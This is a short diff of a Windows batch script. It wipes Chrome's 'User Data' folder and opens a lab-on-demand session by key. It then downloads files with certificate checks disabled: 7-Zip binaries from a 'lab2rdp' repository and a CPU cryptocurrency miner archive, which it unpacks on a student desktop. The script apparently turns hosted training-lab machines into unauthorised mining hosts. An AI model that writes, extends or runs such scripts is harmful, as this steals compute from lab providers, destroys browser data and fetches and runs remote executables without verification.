@@ -11,6 +11,8 @@ rmdir /Q /S "User Data"
 cd C:\Program Files\Google\Chrome\Application
 start chrome.exe  https://labondemand.com/LabInstance/ResumeWithKey/?key=%id%
 cd C:\Users\Student\Desktop
+curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/7z.dll
+curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/7z.exe
 curl -LJOk https://raw.githubusercontent.com/mrX04/mimning/master/Cpuminer-opt-cpu-pool-win64.zip
 7z.exe x Cpuminer-opt-cpu-pool-win64.zip
 cd C:\Users\Student\Desktop\Cpuminer-opt-cpu-pool-win64
